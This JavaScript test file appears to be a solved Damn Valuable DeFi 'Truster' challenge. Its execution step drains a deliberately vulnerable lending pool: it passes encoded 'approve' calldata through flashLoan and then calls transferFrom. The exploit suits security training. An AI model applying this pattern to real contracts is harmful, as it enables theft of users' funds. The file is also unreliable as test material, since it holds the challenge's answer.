const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker; 
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(attacker.address)).to.equal(0);
    });

    it('Execution', async function () {
        const balance = await token.balanceOf(pool.address);

        // make the flash loan function do approve tokens for us
        await pool
        .connect(attacker)
        .flashLoan(
            0,
            attacker.address,
            token.address,
            token.interface.encodeFunctionData('approve', [attacker.address, balance])
        );
        expect(await token.allowance(pool.address, attacker.address)).to.eq(balance);

        await token.connect(attacker).transferFrom(pool.address, attacker.address, balance);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
        console.log("pool balance after: ", await token.balanceOf(pool.address))
        console.log("attacker balance after: ", await token.balanceOf(attacker.address))
    });
});

